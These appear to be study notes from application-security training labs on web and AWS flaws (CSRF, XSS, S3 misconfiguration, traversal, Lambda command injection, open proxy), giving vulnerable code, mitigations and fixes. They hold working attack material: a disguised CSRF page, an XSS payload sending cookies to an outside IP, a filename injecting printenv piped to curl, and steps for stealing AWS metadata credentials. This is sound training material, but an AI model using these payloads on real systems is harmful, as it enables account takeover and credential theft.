* CSRF :- Login -> Change phone number -> No token -> CSRF POC -> Change number  
**  POC :
```html
<html>
<body>

<h1>We’re currently experiencing technical difficulties.</h1>
<h2>This has impacted our website, Contact Center and Live Chat Teams. We are aiming to have this fixed as soon as possible. We sincerely apologies for any inconvenience caused.</h2>
<p>In the meantime head to our Help & Support page. For more information contact our Live Chat team but please be aware team have limited functionality at present.</p>

<button>VISIT HELP & SUPPORT</button>

<script>
  fetch('https://www.sparkpay.com/api/phone', {
    method: 'PUT',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: '{"phone": "07739364408"}',
  });
</script>

</body>
</html>
```
  - Mitigation :- A number of effective methods exist for both the prevention and mitigation of CSRF attacks. Among the most common mitigation methods is to embed unique random tokens, also known as anti-CSRF tokens for every HTTP request and response cycle which are subsequently checked and verified by the server.
  The server generates a random, unpredictable CSRF token and renders it in HTML, usually via a <meta> tag called csrf-token. It also sends a HttpOnly cookie with the same token.
  When the server receives a mutable HTTP request, it checks if the request contains the correct CSRF token, which is usually expected to be provided via the X-XSRF-TOKEN header. If the header exists and its value matches the value from the cookie, the server allows the request. Otherwise, it produces an error.
  The developer has to make sure that both the server and the client are in sync, i.e. the client should send the requests with the correct header name, which is expected by the server.
  Since a potential attacker can never guess the value of these tokens, anti-CSRF tokens provide a strong defense against CSRF attacks.
  Note - CSRF and XSRF are two different abbreviatures with the same meaning: Cross-Site Request Forgery.
```js
import React, { useState } from 'react';

const PhoneForm = () => {
  const [phone, setPhone] = useState('');

  const onChange = ({ target }) => setPhone(target.value);

  const onSubmit = () => {
    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

    fetch('https://www.sparkpay.com/api/phone', {
      method: 'PUT',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
      },
      body: JSON.stringify({
        phone: phone,
      }),
    });
  };

  return (
    <form name="phoneForm" onSubmit={onSubmit}>
      <label for="phone-input">Mobile Number</label>
      <input id="phone-input" name="phone" value={phone} onChange={onChange}>

      <button type="submit">Save</button>
      <button>Cancel</button>
    </form>
  );
};
```

> https://guest.application.security/exercises/298
* Direct DOM Manipulation XSS :- Login -> Framework tab (filters for framework) -> In source filter value goes in innerhtml -> pop XSS  
```js
import React, { useEffect } from 'react';

const Tabs = () => {
  useEffect(() => {
    const category = new URL(location.href).searchParams.get('filter').replace('+', ' ') || 'All';
    document.getElementById('currentTabName').innerHTML = category; // <span id="currentTabName">{{filter}}</span>
  }, []);

  return (
    <div>
      <h2>Find a Solution (<span id="currentTabName"></span>)</h2>

      <div className="tabs">
        <div>All</div>
        <div>Developer Tools</div>
        <div>Frameworks</div>
      </div>
    </div>
  );
};
```
  - Mitigation :- 
```text
To effectively mitigate against Document Object Model (DOM) based cross-site scripting vulnerabilities, developers must avoid using the direct DOM manipulations, utilizing React's interpolation instead.

If the direct DOM manipulation cannot be avoided, the developer has to make sure that all the untrusted data is sanitized before injecting it into the DOM.

For example, if client-side JavaScript is used to manipulate the content, structure, or style of a document's DOM element with user-supplied data, such input strings must be sanitized (encoded or escaped) for safe insertion into a document's DOM. 

Additionally, DOM objects that may be influenced by the user (attacker) should be carefully reviewed and escaped, including (but not limited to):

  document.URL
  document.URLUnencoded
  document.location (and child properties)
  document.referrer
  window.location (and child properties)
```

```js
import React, { useState, useEffect } from 'react';

const Tabs = () => {
  const [category, setCategory] = useState('All');

  useEffect(() => {
    const category = new URL(location.href).searchParams.get('filter').replace('+', ' ') || 'All';
    setCategory(category);
  }, []);

  return (
    <div>
      <h2>Find a Solution (<span>{category}</span>)</h2>

      <div className="tabs">
        <div>All</div>
        <div>Developer Tools</div>
        <div>Frameworks</div>
      </div>
    </div>
  );
};
```

> https://guest.application.security/exercises/300
* Components with Known Vulnerabilities :- On web look for old ruby version.  
```text
To sum up, component-based vulnerabilities occur when a web application component is unsupported, out of date, or vulnerable to a known exploit.
To effectively mitigate against component-based vulnerabilities, developers must regularly audit software components and their dependencies, making sure the third-party libraries and software dependencies are always up-to-date.
To check installed npm dependencies for vulnerabilities, developers may use the npm audit command, which scans the project for vulnerabilities and automatically installs any compatible updates to vulnerable dependencies.
Product teams must further establish security policies governing the use of third-party libraries, such as passing security tests, and regular patching and updating of application dependencies.
```

> https://guest.application.security/exercises/301
* Untrusted HTML Rendering XSS :- 
**  Payload 
```html
<img src=x onerror="javascript:new Image().src='http://193.112.33.32/?cookie=' + document.cookie;">
```
** Code
```js
import React from 'react';
import PropTypes from 'prop-types';

const SupportTicket = ({ ticket }) => {
  return (
    <div>
      <div>
        <h2>Details</p>
        <p>Type: {ticket.type}</p>
        <p>Status: {ticket.status}</p>
        <p>Priority: {ticket.priority}</p>
        <p>Resolution: {ticket.resolution}</p>
      </div>

      <div>
        <h2>People</p>
        <p>Assignee: {ticket.assignee}</p>
        <p>Reporter: {ticket.reporter}</p>
      </div>

      <div>
        <h2>Description</p>
        <p dangerouslySetInnerHTML={{ __html: ticket.description }} /> 
      </div>
    </div>
  );
};

SupportTicket.propTypes = {
  ticket: PropTypes.object.isRequired,
};
```

  - Mitigation :- In order to effectively mitigate against stored Cross-site Scripting attacks, developers must ensure all user-supplied data is either HTML encoded or sanitized before being rendered to the web page. React automatically escapes all untrusted data, converting it to plain text, a value that's safe to insert into the DOM. However, In specific situations, it might be necessary to disable the escaping mechanism and render the value as HTML. A developer can bypass security by using the dangerouslySetInnerHTML attribute, which renders the value as HTML. These situations should be very rare, and extraordinary care must be taken to avoid creating an XSS security bug, especially when the data comes from an untrusted source!

```js
import React from 'react';
import PropTypes from 'prop-types';
import sanitizeHtml from 'sanitize-html';

const SupportTicket = ({ ticket }) => {
  const sanitizedDescription = sanitizeHtml(ticket.description);

  return (
    <div>
      <div>
        <h2>Details</p>
        <p>Type: {ticket.type}</p>
        <p>Status: {ticket.status}</p>
        <p>Priority: {ticket.priority}</p>
        <p>Resolution: {ticket.resolution}</p>
      </div>

      <div>
        <h2>People</p>
        <p>Assignee: {ticket.assignee}</p>
        <p>Reporter: {ticket.reporter}</p>
      </div>

      <div>
        <h2>Description</p>
        <p dangerouslySetInnerHTML={{ __html: sanitizedDescription }} /> 
      </div>
    </div>
  );
};

SupportTicket.propTypes = {
  ticket: PropTypes.object.isRequired,
};
```

## AWS for Java
> https://guest.application.security/exercises/498
* Subdomain Takeover :- Bucket created -> then deleted only bucket -> 404 Message : The specified bucket does not exists -> s3 account login and create new bucket -> upload malicious file -> Visit/Refresh the page 

  - Mitigation :- Preventing subdomain takeovers is a matter of reviewing your organization’s DNS records in a routine manner to identify and remove stale or unused DNS entries.
  Developers and DevOps engineers must also maintain a service catalog of their organization’s domains and their hosting providers and update any incorrect or outdated subdomain references when application changes are made.
  The review must further be incorporated when discontinuing or terminating a service and ensuring all associated DNS entries, hostnames, and subdomains are removed for the service.

> https://guest.application.security/exercises/499
* S3 Bucket Public 'READ' Access :- Use s3recon & scan for aws s3 buckets -> One of them is publicly assessible -> COntains sensitive files and users data
  - Mitigation :- Unless your business use case requires anyone on the internet to be able to read or write to your S3 bucket, ensure all such access permissions are reviewed and further configured to disable public access. 
  
  Developers must further consider and review the security side effects of declaring wildcard policies, such as configuring a wildcard identity e.g. Principal set to “*” which effectively indicates anonymous identity or configuring a wildcard Action set to “*” which allows the user to perform any action (READ, WRITE) in the Amazon S3 bucket.
  
  In addition to manually reviewing your S3 buckets on a regular basis, developers can consider incorporating Cloud Security Posture Management (CSPM) tools to automate the monitoring, identification, and resolution of misconfigured cloud assets.
    These include the following commercial and opensource solutions:
    Commercial tool:
     Aquasec: www.aquasec.com
     Bridgecrew: www.bridgecrew.io
     Crowdstrike: www.crowdstrike.com
     Snyk: www.snyk.io

    Opensource tools:
     Cloudsploit: www.cloudsploit.com

```bash
alice@localhost:-# cat policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::346608081374:user/backup-user"
            },
            "Action": [
                "s3:GetObject",
                "s3:PutObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::mwillo-backup/*",
                "arn:aws:s3:::mwillo-backup"
            ],
            "Condition": {
                "IpAddress": {
                    "aws:SourceIp": [
                        "192.168.1.1",
                        "192.168.1.2"
                    ]
                }
            }
        }
    ]
}
alice@localhost:-# 
```

> https://guest.application.security/exercises/500
* S3 Bucket Authenticated Users 'WRITE' Access :- Locate a s3 bucket via html source hosting loader.js file -> No directory listing through aws -> But you can upload files -> Upload malicious loader.js (with cookie fetching script) -> This upload will overwrite the old js file and new will ne loaded -> whenever anyoune visits cookie gets fetched to attackers server 
Vuln Code
```bash
alice@localhost:-# aws s3api get-bucket-policy --bucket tiktik-web-assets --output text | jq
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "s3:GetObject",
                "s3:PutObject"
            ],
            "Principal": "*",
            "Effect": "Allow",
            "Resource": [
                "arn:aws:s3:::tiktik-web-assets/*"
            ]
        }
    ]
}
alice@localhost:-# 
```
  - Mitigation :- Unless your business use case requires anyone on the internet to be able to read or write to your S3 bucket, ensure all such access permissions are reviewed and further configured to disable public access.

  Developers must further consider and review the security side effects of declaring wildcard policies, such as configuring a wildcard identity e.g. Principal set to “*” which effectively indicates anonymous identity or configuring a wildcard Action set to “*” which allows the user to perform any action (READ, WRITE) in the Amazon S3 bucket.

  In addition to manually reviewing your S3 buckets on a regular basis, developers can consider incorporating Cloud Security Posture Management (CSPM) tools to automate the monitoring, identification, and resolution of misconfigured cloud assets.
    These include the following commercial and opensource solutions:
    Commercial tool:
     Aquasec: www.aquasec.com
     Bridgecrew: www.bridgecrew.io
     Crowdstrike: www.crowdstrike.com
     Snyk: www.snyk.io

    Opensource tools:
     Cloudsploit: www.cloudsploit.com


```bash
alice@localhost:-# cat policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": [
                "s3:GetObject"
            ],
            "Principal": "*",
            "Effect": "Allow",
            "Resource": [
                "arn:aws:s3:::tiktik-web-assets/*"
            ]
        }
    ]
}
alice@localhost:-# 
```

> https://guest.application.security/exercises/501
* S3 Directory Traversal :- Go to webpage -> Upload a jpg file -> It renders and in responce we see a presigned URL that gives temprorary access to that file in aws s3 bucket -> Reupload it but in proxy change filename to "../../" and upload it -> Access the aws url and we did travresal 
Vuln Code
```java
  private static final Logger LOG = LogManager.getLogger(GenerateReportURLHandler.class);

  private final static Regions region = Regions.fromName("eu-west-2");
  private final static String bucketName = "coinpay-prod";
  private final String s3BasePath = "assets/uploads/";

  @Override
  public APIGatewayProxyResponseEvent handleRequest(APIGatewayProxyRequestEvent input, Context context) {

    APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent = new APIGatewayProxyResponseEvent();

    try {
      LOG.info("received: {}", input.toString());


      Map < String, String > inputParams = input.getQueryStringParameters();

      if (inputParams == null) {
        Map < String, String > responseBody = new HashMap < String, String > ();
        responseBody.put("message", "required query parameters: ['key', 'document]");
        generateResponse(
          apiGatewayProxyResponseEvent,
          new JSONObject(responseBody).toJSONString(),
          400);

        return apiGatewayProxyResponseEvent;
      }

      String key = inputParams.get("key");

      // join s3 base path with given key and normalize the path
      Path s3Path = Paths.get(s3BasePath + key); // no validation and is user controllable
      String normalizedPath = s3Path.normalize().toString();

      AmazonS3 s3Client = AmazonS3ClientBuilder.standard()
        .withRegion(region)
        .build();

      GeneratePresignedUrlRequest generatePresignedUrlRequest = new GeneratePresignedUrlRequest(bucketName, normalizedPath)
        .withMethod(HttpMethod.GET);

      URL url = s3Client.generatePresignedUrl(generatePresignedUrlRequest);

      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("presigned_url", url.toString());

      String responseMessage = new JSONObject(responseBody).toJSONString();
      generateResponse(
        apiGatewayProxyResponseEvent,
        responseMessage,
        200);
    } catch (AmazonServiceException e) {
      // The call was transmitted successfully, but Amazon S3 couldn't process
      // it, so it returned an error response.
      e.printStackTrace();

      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("message", "Unable to connect to AWS s3");
      generateResponse(
        apiGatewayProxyResponseEvent,
        new JSONObject(responseBody).toJSONString(),
        500);
    } catch (SdkClientException e) {
      // Amazon S3 couldn't be contacted for a response, or the client
      // couldn't parse the response from Amazon S3.
      e.printStackTrace();

      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("message", "Unable to connect to AWS s3");
      generateResponse(
        apiGatewayProxyResponseEvent,
        new JSONObject(responseBody).toJSONString(),
        500);
    } catch (Throwable e) {
      // Catch all other errors
      e.printStackTrace();

      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("message", "Something went wrong");
      generateResponse(
        apiGatewayProxyResponseEvent,
        new JSONObject(responseBody).toJSONString(),
        500);
    }

    return apiGatewayProxyResponseEvent;
  }
```

  - Mitigation :- The most effective way to prevent Directory Traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior more securely. 

  However, if this is not possible, the application should perform strict input validation against parameters that are intended to be used for file system operations. These include path validation and absolute path checking of user-supplied data.
```java
  private static final Logger LOG = LogManager.getLogger(GenerateReportURLHandler.class);

private final static Regions region = Regions.fromName("eu-west-2");
private final static String bucketName = "coinpay-prod";
private final String s3BasePath = "assets/uploads/";

@Override
public APIGatewayProxyResponseEvent handleRequest(APIGatewayProxyRequestEvent input, Context context) {

  APIGatewayProxyResponseEvent apiGatewayProxyResponseEvent = new APIGatewayProxyResponseEvent();

  try {
    LOG.info("received: {}", input.toString());


    Map < String, String > inputParams = input.getQueryStringParameters();

    if (inputParams == null) {
      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("message", "required query parameters: ['key', 'document]");
      generateResponse(
        apiGatewayProxyResponseEvent,
        new JSONObject(responseBody).toJSONString(),
        400);

      return apiGatewayProxyResponseEvent;
    }

    String key = inputParams.get("key");
    Path inputPath = Paths.get(key);

    // check if the key passed is a valid file name using regex
    Boolean isFilenameValid = key.matches("[-_A-Za-z0-9]+\\.(jpeg|jpg|png)");
    if (inputPath.getNameCount() > 1 || !isFilenameValid) {
      Map < String, String > responseBody = new HashMap < String, String > ();
      responseBody.put("message", "invalid data for parameter: key, expected filename.extension (jpeg, jpg, png)");
      generateResponse(
        apiGatewayProxyResponseEvent,
        new JSONObject(responseBody).toJSONString(),
        400);

      return apiGatewayProxyResponseEvent;
    }

    // join s3 base path with given key and normalize the path
    Path s3Path = Paths.get(s3BasePath + key);
    String normalizedPath = s3Path.normalize().toString();

    AmazonS3 s3Client = AmazonS3ClientBuilder.standard()
      .withRegion(region)
      .build();

    GeneratePresignedUrlRequest generatePresignedUrlRequest = new GeneratePresignedUrlRequest(bucketName, normalizedPath)
      .withMethod(HttpMethod.GET);

    URL url = s3Client.generatePresignedUrl(generatePresignedUrlRequest);

    Map < String, String > responseBody = new HashMap < String, String > ();
    responseBody.put("presigned_url", url.toString());

    String responseMessage = new JSONObject(responseBody).toJSONString();
    generateResponse(
      apiGatewayProxyResponseEvent,
      responseMessage,
      200);
  } catch (AmazonServiceException e) {
    // The call was transmitted successfully, but Amazon S3 couldn't process
    // it, so it returned an error response.
    e.printStackTrace();

    Map < String, String > responseBody = new HashMap < String, String > ();
    responseBody.put("message", "Unable to connect to AWS s3");
    generateResponse(
      apiGatewayProxyResponseEvent,
      new JSONObject(responseBody).toJSONString(),
      500);
  } catch (SdkClientException e) {
    // Amazon S3 couldn't be contacted for a response, or the client
    // couldn't parse the response from Amazon S3.
    e.printStackTrace();

    Map < String, String > responseBody = new HashMap < String, String > ();
    responseBody.put("message", "Unable to connect to AWS s3");
    generateResponse(
      apiGatewayProxyResponseEvent,
      new JSONObject(responseBody).toJSONString(),
      500);
  } catch (Throwable e) {
    // Catch all other errors
    e.printStackTrace();

    Map < String, String > responseBody = new HashMap < String, String > ();
    responseBody.put("message", "Something went wrong");
    generateResponse(
      apiGatewayProxyResponseEvent,
      new JSONObject(responseBody).toJSONString(),
      500);
  }

  return apiGatewayProxyResponseEvent;
}
```

> https://guest.application.security/exercises/502
* Weak S3 POST Upload Policy :- Upload a image file -> look in forward request responce -> POST request is being sent -> there is key paramter handling name of file -> change file name to a full directory and then followed by filename -> upload file is stored at the defined directory    
```html
<div class="cmp cmp-image aem-GridColumn aem-GridColumn--default--12">
  <a class="bb-iconBlock icon-nonAPI" href="https://bc-software-downloads.s3.amazonaws.com/downloads/drivers/statc-library-fw-v9.1.0.122.dmg">
     <div class="cmp-image">
        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:false}">
           <img src="/us/en/products/blackcherry-dynamics/macos/_jcr_content/root/responsivegrid/responsivegrid_13507/authorizationcontain/gridContent-auth/iconblock.img.png/1586275093361.png" alt/>
        </noscript>
     </div>
     <h2>Static Library v9.1.0.122</h2>
  </a>
</div>
<div class="cmp cmp-image aem-GridColumn aem-GridColumn--default--12">
  <a class="bb-iconBlock icon-nonAPI" href="https://bc-software-downloads.s3.amazonaws.com/downloads/drivers/dynamic-fw-v9.1.0.122.dmg">
     <div class="cmp-image">
```
Vuln Code 
```js
const AWS = require('aws-sdk');
const moment = require('moment');

AWS.config.update({
    region: process.env.REGION,
    credentials: {
      accessKeyId: process.env.ACCESS_KEY,
      secretAccessKey: process.env.SECRET_KEY
    }
});

async function generateUploadURL(_, context, __) {
    context.callbackWaitsForEmptyEventLoop = false;
    try {
        // create s3 client
        const s3 = new AWS.S3({
            signatureVersion: 'v4'
        });

        // create parameters for generating signed post url
        // expiry in seconds
        const expiry = 60 * 10;

        const fields = {
            acl: 'public-read'
        };

        const date = moment().format('YYYYMMDD');
        const credential = `${process.env.ACCESS_KEY}/${date}/${process.env.REGION}/s3/aws4_request`;

        // upload policy conditions
        const conditions = [
            {"bucket": process.env.AWS_S3_BUCKET},
            ["starts-with", "$key", ""], // "" this should be replaced by valid path to upload directory 
            {"acl": "public-read"},
            {"x-amz-meta-uuid": "14365123651274"},
            {"x-amz-server-side-encryption": "AES256"},
            ["starts-with", "$x-amz-meta-tag", ""],
            {"x-amz-credential": credential},
            {"x-amz-algorithm": "AWS4-HMAC-SHA256"}
        ];

        const presignedResponse = s3.createPresignedPost({
            Expires: expiry, // expiry time in seconds
            Bucket: process.env.AWS_S3_BUCKET,
            // policy for Upload request
            Conditions: conditions,
            Fields: fields
        });

        return {
            statusCode: 200,
            body: JSON.stringify(presignedResponse, null, 2)
        };
    } catch (error) {
        console.log(error);
        return {
            statusCode: 500,
            body: JSON.stringify({
                message: 'Something went wrong'
            }, null, 2)
        };
    }
}

module.exports = {
    generateUploadURL
};
```

  - Mitigation :- In order to effectively mitigate against weakly configured POST upload policies, developers must always define a base path when creating a POST upload policy. 

  Further, developers can completely remove the policy configuration attribute ["starts-with", "$key", "user/user1/"] and use a defined key with a randomized (non-guessable) object name.

```js
const AWS = require('aws-sdk');
const moment = require('moment');

AWS.config.update({
    region: process.env.REGION,
    credentials: {
      accessKeyId: process.env.ACCESS_KEY,
      secretAccessKey: process.env.SECRET_KEY
    }
});

async function generateUploadURL(_, context, __) {
    context.callbackWaitsForEmptyEventLoop = false;
    try {
        // create s3 client
        const s3 = new AWS.S3({
            signatureVersion: 'v4'
        });

        // create parameters for generating signed post url
        // expiry in seconds
        const expiry = 60 * 10;

        const baseURL = 'assets/uploads';
        const fileName = Math.random().toString(36).slice(2);

        const fields = {
            acl: 'private',
            key: `${baseURL}/${fileName}.jpg`
        };

        const date = moment().format('YYYYMMDD');
        const credential = `${process.env.ACCESS_KEY}/${date}/${process.env.REGION}/s3/aws4_request`;

        // upload policy conditions
        const conditions = [
            {"bucket": process.env.AWS_S3_BUCKET},
     //     ["starts-with", "$key", ""],
            {"acl": "private"},
            {"x-amz-meta-uuid": "14365123651274"},
            {"x-amz-server-side-encryption": "AES256"},
            ["starts-with", "$x-amz-meta-tag", ""],
            {"x-amz-credential": credential},
            {"x-amz-algorithm": "AWS4-HMAC-SHA256"},
            ["starts-with", "$Content-Type", "image/"]
        ];

        const presignedResponse = s3.createPresignedPost({
            Expires: expiry, // expiry time in seconds
            Bucket: process.env.AWS_S3_BUCKET,
            // policy for Upload request
            Conditions: conditions,
            Fields: fields
        });

        return {
            statusCode: 200,
            body: JSON.stringify(presignedResponse, null, 2)
        };
    } catch (error) {
        console.log(error);
        return {
            statusCode: 500,
            body: JSON.stringify({
                message: 'Something went wrong'
            }, null, 2)
        };
    }
}

module.exports = {
    generateUploadURL
};
```
> https://guest.application.security/exercises/503
* Lambda Command Injection :- Upload pdf via mail -> change filename to "xxx; printenv | curl 54.151.161.121 --data-urlencode @-; #.pdf" -> and we get responce on our netcat
Vuln code
```java
public class Handler implements RequestHandler<SNSEvent, Object> {

  private static final Logger LOG = LogManager.getLogger(Handler.class);
  private static final String TABLE_NAME = System.getenv("DYNAMODB_TABLE_NAME");

  @Override
  public Object handleRequest(SNSEvent request, Context context) {
    List<SNSEvent.SNSRecord> snsRecordList = request.getRecords();

    if (snsRecordList != null) {
      SNSEvent.SNS recordSNS = null;

      // process records
      for (SNSEvent.SNSRecord snsRecord : snsRecordList) {
        recordSNS = snsRecord.getSNS();
        JSONObject messageContent;

        // parse json object from SNS containing email data
        try {
          JSONParser jsonParser = new JSONParser();
          messageContent = (JSONObject) jsonParser.parse(recordSNS.getMessage());
        } catch (ParseException e) {
          LOG.error("ParseException: {}", e.getMessage());
          return null;
        }

        // get encoded raw email content from request
        String rawEmail = (String) messageContent.get("content");
        byte[] bytes;
        try {
          bytes = rawEmail.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
          // handle unsupported encoding exception
          LOG.error("UnsupportedEncodingException: {}", e.getMessage());
          return null;
        }

        // create a byte stream of the content
        Session session = Session.getInstance(new Properties());
        InputStream byteInputStream = new ByteArrayInputStream(bytes);

        MimeMessage message;

        try {
          message = new MimeMessage(
            session,
            byteInputStream
          );

          String from = message.getFrom()[0].toString();
          Multipart multiPartMessage = (Multipart) message.getContent();

          // parse multipart message and get attachment
          for (int i = 0; i < multiPartMessage.getCount(); i++) {
            MimeBodyPart part = (MimeBodyPart) multiPartMessage.getBodyPart(i);
            if ("attachment".equalsIgnoreCase(part.getDisposition())) {
              // export attachment to /tmp
              String fileName = part.getFileName();
              if (!fileName.endsWith(".pdf")) {
                LOG.error("File {} doesn't end with .pdf", fileName);
                continue;
              }

              part.saveFile("/tmp/" + fileName);

              // extract text from pdf file
              Process proc = Runtime.getRuntime().exec(new String[] {
                "bash",
                "-c",
                "./lib/pdf2text /tmp/" + fileName
                  
                                // bash -c /lib/pdf2text /tmp/xxx; printenv | curl 54.151.161.121 --data-urlencode @-;  #.pdf

              });

              proc.waitFor();
              BufferedReader output;

              if (proc.exitValue() == 0) {
                // extract text output from pdf file
                String pdfContent = null;
                String line;

                output = new BufferedReader(
                  new InputStreamReader(proc.getInputStream())
                );

                while ((line = output.readLine()) != null) {
                  pdfContent += line;
                }

                // initialize DynamoDB client and table
                AmazonDynamoDB client = AmazonDynamoDBClientBuilder.standard().build();
                DynamoDB dynamoDB = new DynamoDB(client);
                Table table = dynamoDB.getTable(TABLE_NAME);

                // create a new item with email data
                Item item = new Item()
                  .withString("email", from)
                  .withString("attachment", pdfContent);

                PutItemOutcome outcome = table.putItem(item);
                LOG.info("outcome: {}", outcome.toString());
              } else {
                // read error stream from command line
                output = new BufferedReader(
                  new InputStreamReader(proc.getErrorStream())
                );

                String line;
                LOG.error("Command execution failed");
                while ((line = output.readLine()) != null) {
                  LOG.error(line);
                }
              }
            }
          }
        } catch (MessagingException e) {
          // Exception due to message parsing
          LOG.error("MessagingException: {}", e.getMessage());
        } catch (IOException e) {
          // Exception due to Runtime execution
          LOG.error("IOException: {}", e.getMessage());
        } catch (InterruptedException e) {
          // Exception due to Interruption of runtime execution
          LOG.error("InterruptedException: {}", e.getMessage());
        }
            }
    }
    return null;
  }
}
``` 

  - Mitigation :- To effectively mitigate against Command Injection attacks, developers must avoid passing user-controllable input in functions or system calls that interface with the operating system environment or invoke third-party applications.
  If this is unavoidable, development teams must perform rigorous input validation against all user-supplied data which includes:
    * Validating against a whitelist of permitted values.
    * Validating the input length.
    * Validating that the input contains only alphanumeric values, ignoring all other escape characters or whitespace string. 

```java
public class Handler implements RequestHandler<SNSEvent, Object> {

  private static final Logger LOG = LogManager.getLogger(Handler.class);
  private static final String TABLE_NAME = System.getenv("DYNAMODB_TABLE_NAME");

  @Override
  public Object handleRequest(SNSEvent request, Context context) {
    List<SNSEvent.SNSRecord> snsRecordList = request.getRecords();

    if (snsRecordList != null) {
      SNSEvent.SNS recordSNS = null;

      // process records
      for (SNSEvent.SNSRecord snsRecord : snsRecordList) {
        recordSNS = snsRecord.getSNS();
        JSONObject messageContent;

        // parse json object from SNS containing email data
        try {
          JSONParser jsonParser = new JSONParser();
          messageContent = (JSONObject) jsonParser.parse(recordSNS.getMessage());
        } catch (ParseException e) {
          LOG.error("ParseException: {}", e.getMessage());
          return null;
        }

        // get encoded raw email content from request
        String rawEmail = (String) messageContent.get("content");
        byte[] bytes;
        try {
          bytes = rawEmail.getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
          // handle unsupported encoding exception
          LOG.error("UnsupportedEncodingException: {}", e.getMessage());
          return null;
        }

        // create a byte stream of the content
        Session session = Session.getInstance(new Properties());
        InputStream byteInputStream = new ByteArrayInputStream(bytes);

        MimeMessage message;

        try {
          message = new MimeMessage(
            session,
            byteInputStream
          );

          String from = message.getFrom()[0].toString();
          Multipart multiPartMessage = (Multipart) message.getContent();

          // parse multipart message and get attachment
          for (int i = 0; i < multiPartMessage.getCount(); i++) {
            MimeBodyPart part = (MimeBodyPart) multiPartMessage.getBodyPart(i);
            if ("attachment".equalsIgnoreCase(part.getDisposition())) {
              // export attachment to /tmp
              String fileName = part.getFileName();
              if (!fileName.matches("[-_A-Za-z0-9]+\\.(pdf)")) {
                LOG.error("File {} doesn't match the regex. Incorrect file name format", fileName);
                continue;
              }

              part.saveFile("/tmp/" + fileName);

              // extract text from pdf file
              Process proc = Runtime.getRuntime().exec(new String[] {
                "bash",
                "-c",
                "./lib/pdf2text /tmp/" + fileName
              });

              proc.waitFor();
              BufferedReader output;

              if (proc.exitValue() == 0) {
                // extract text output from pdf file
                String pdfContent = null;
                String line;

                output = new BufferedReader(
                  new InputStreamReader(proc.getInputStream())
                );

                while ((line = output.readLine()) != null) {
                  pdfContent += line;
                }

                // initialize DynamoDB client and table
                AmazonDynamoDB client = AmazonDynamoDBClientBuilder.standard().build();
                DynamoDB dynamoDB = new DynamoDB(client);
                Table table = dynamoDB.getTable(TABLE_NAME);

                // create a new item with email data
                Item item = new Item()
                  .withString("email", from)
                  .withString("attachment", pdfContent);

                PutItemOutcome outcome = table.putItem(item);
                LOG.info("outcome: {}", outcome.toString());
              } else {
                // read error stream from command line
                output = new BufferedReader(
                  new InputStreamReader(proc.getErrorStream())
                );

                String line;
                LOG.error("Command execution failed");
                while ((line = output.readLine()) != null) {
                  LOG.error(line);
                }
              }
            }
          }
        } catch (MessagingException e) {
          // Exception due to message parsing
          LOG.error("MessagingException: {}", e.getMessage());
        } catch (IOException e) {
          // Exception due to Runtime execution
          LOG.error("IOException: {}", e.getMessage());
        } catch (InterruptedException e) {
          // Exception due to Interruption of runtime execution
          LOG.error("InterruptedException: {}", e.getMessage());
        }
            }
    }
    return null;
  }
}
```

> https://guest.application.security/exercises/504
* Misconfigured Reverse Proxy :- A staging environment is setup for 3rd party developers and is run through proxy -> Upon visitng the url is something like this ->
"https://proxy-jumpbox.cloudbilling.net/?url=https://api1.dc.dev-east.cloudbilling.net " -> Change url paramter to "https://google.com " and it loads google page that means it is vuln to open proxy attacks -> Again change url to aws metadata "http://169.254.169.254/latest/meta-data/ " -> Extract aws creds 
Vuln code :
```bash 'NGINX configuration file'
server {
    listen[::]:443 ssl ipv6only=on;
    listen 443 ssl;
    server_name proxy-jumpbox.cloudbilling.net;
    resolver 8.8.8.8;
    root /var/www/html;
    location / {
        proxy_pass $arg_url;
    }
    ssl_certificate /etc/letsencrypt/live/proxy-jumpbox.cloudbilling.net/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/proxy-jumpbox.cloudbilling.net/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
}
``` 
  - Mitigation :- The successful attack executed against Cloudbill's NGINX proxy occurred due to a breach of IT security policy and failure to consider technology edge cases against cloud-native environments.
  
  A threat actor like Bob can use simple, but effective techniques to detect and scan networks and applications, which means developers and DevOps must not assume their technology assets are un-discoverable.
  
  Further, developers must ensure appropriate permissions and access-control settings are applied to restrict access to their internet-facing assets. For example, by applying an authentication policy on the NGINX configuration, Jake could have significantly reduced the attack surface by restricting access to the NGINX web server instead of relying on the authentication features of the test, QA, and staging applications.

```bash
upstream api1 { server api1.dc.dev-east.cloudbilling.net; }
upstream semtech { server semtech-0001.dc.dev-east.cloudbilling.net; }
upstream backend-0001 { server backend-0001.dev-east.cloudbilling.net; }
upstream hydra-office { server hydra-office.dc.dev-east.cloudbilling.net; }
upstream hydra2 { server hydra2-office.dc.dev-east.cloudbilling.net; }
upstream a-hydra2 { server a-hydra2-office.dc.dev-east.cloudbilling.net; }
map $arg_url $name {
    api       api1;
    semtech   semtech;
    backend   backend-0001;
    hydra     hydra-office;
    hydra2    hydra2;
    a-hydra2  a-hydra2;
}
server {
    listen[::]: 443 ssl ipv6only=on;
    listen 443 ssl;
    server_name proxy-jumpbox.cloudbilling.net;
    resolver 8.8.8.8;
    location / {
        proxy_pass https://$name;
    }
